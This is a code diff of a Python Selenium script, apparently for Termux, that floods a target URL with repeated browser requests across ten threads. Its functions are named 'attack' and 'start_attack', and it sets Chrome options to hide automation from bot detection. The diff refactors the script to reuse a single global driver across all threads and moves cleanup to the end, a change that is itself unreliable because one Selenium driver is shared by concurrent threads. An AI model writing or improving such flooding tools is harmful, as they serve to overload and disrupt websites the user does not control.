@@ -11,11 +11,19 @@ chrome_options.add_argument("--disable-blink-features=AutomationControlled")
 chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
 chrome_options.add_experimental_option("useAutomationExtension", False)
 
+# Global variable to store the ChromeDriver instance for reuse
+driver = None
+
+# ✅ Initialize the WebDriver (Only Once for All Threads)
+def init_driver():
+    global driver
+    if driver is None:
+        service = Service("/data/data/com.termux/files/usr/bin/chromedriver")  # Correct path for Termux
+        driver = webdriver.Chrome(service=service, options=chrome_options)
+
 # ✅ Start Attack Function
 def attack(url, total_requests):
-    # Update path to chromedriver
-    service = Service("/data/data/com.termux/files/usr/bin/chromedriver")  # Correct path for Termux
-    driver = webdriver.Chrome(service=service, options=chrome_options)
+    init_driver()  # Ensure the driver is initialized before starting the attack
 
     for _ in range(total_requests):
         try:
@@ -25,8 +33,6 @@ def attack(url, total_requests):
         except Exception as e:
             print(f"❌ Failed: {e}")
     
-    driver.quit()
-
 # ✅ Multi-Threaded Attack
 def start_attack(url, total_requests, threads):
     thread_list = []
@@ -45,3 +51,7 @@ if __name__ == "__main__":
     threads = 10  # ✅ Number of Threads (Parallel Attacks)
     
     start_attack(target_url, total_requests, threads)
+
+    # Cleanup driver after attack is complete
+    if driver:
+        driver.quit()
